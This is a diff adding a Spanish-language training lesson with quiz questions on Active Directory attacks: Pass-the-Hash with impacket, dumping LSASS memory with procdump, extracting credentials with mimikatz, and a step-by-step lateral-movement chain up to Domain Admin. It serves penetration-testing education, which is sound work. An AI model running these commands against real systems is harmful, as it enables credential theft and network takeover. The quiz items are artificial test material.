@@ -1,0 +1,74 @@
+---
+index: 3
+title: "Pass-the-Hash, Pass-the-Ticket y movimiento lateral"
+questions:
+  - id: active-directory-ataque-t03-q01
+    prompt: "¿Qué ataque usa el HASH NTLM de un usuario (sin conocer la contraseña) para autenticarse?"
+    hint: "Pass-the-Hash (PtH). psexec/smbexec/wmiexec de impacket lo hacen."
+    kind: text
+  - id: active-directory-ataque-t03-q02
+    prompt: "Comprometes un servidor con credenciales de un Domain Admin en memoria. ¿Qué haces?"
+    hint: "Mimikatz extrae credenciales de LSASS."
+    kind: text
+  - id: active-directory-ataque-t03-q03
+    prompt: "¿Qué herramienta de Sysinternals vuelca credenciales del proceso LSASS?"
+    hint: "procdump o comsvcs.dll MiniDump. Mimikatz las procesa."
+    kind: choice
+    options:
+      - id: a
+        label: "Task Manager"
+      - id: b
+        label: "Mimikatz (o procdump + mimikatz offline)"
+      - id: c
+        label: "Wireshark"
+      - id: d
+        label: "Nmap"
+---
+
+## Pass-the-Hash: no necesitas la contraseña
+
+NTLM autentica con el HASH, no con la contraseña en claro. Si tienes el hash NTLM
+(obtenido de un dump, de un servicio, de Kerberoast crackeado), puedes autenticarte:
+
+```bash
+# Con impacket (desde Linux):
+psexec.py -hashes :NT_HASH admin@10.10.10.10     # shell como admin
+smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:NT_HASH admin@10.10.10.10
+wmiexec.py -hashes :NT_HASH admin@10.10.10.10
+```
+
+Con el hash de un Domain Admin → shell SYSTEM en el DC → dominio comprometido.
+
+## Mimikatz: la llave maestra
+
+Cuando comprometes un Windows con credenciales de otros usuarios en memoria (LSASS):
+
+```cmd
+:: 1. Volcar LSASS (necesitas admin o SYSTEM)
+procdump -ma lsass.exe lsass.dmp
+
+:: 2. Extraer credenciales con mimikatz
+mimikatz # sekurlsa::logonpasswords
+:: Output: usuarios, hashes NTLM, tickets Kerberos en memoria
+```
+
+Mimikatz revela TODO lo que el sistema recuerda: contraseñas en claro de sesiones
+anteriores, hashes NTLM, tickets TGT/TGS. Por eso el objetivo es llegar a un servidor
+donde un admin ha iniciado sesión recientemente.
+
+## Movimiento lateral: el plan completo
+
+```text
+1. Shell como usuario normal en cualquier máquina del dominio
+2. BloodHound → ¿quién tiene sesión en mi máquina? ¿quién soy admin local?
+3. Kerberoast → crackear contraseña de cuenta de servicio
+4. Pass-the-Hash con esa credencial → acceso a nuevo servidor
+5. En el nuevo servidor: mimikatz → credenciales de alguien más privilegiado
+6. Repetir hasta Domain Admin → DC → dominio completo
+```
+
+**La cadena entera es lo que BloodHound visualiza**. Cada arista del grafo es una
+técnica de este room. En los labs avanzados del path la practicarás de punta a punta.
+
+Con Active Directory cerrado, el último módulo del path te convierte en scripter:
+automatizar tu propio arsenal.
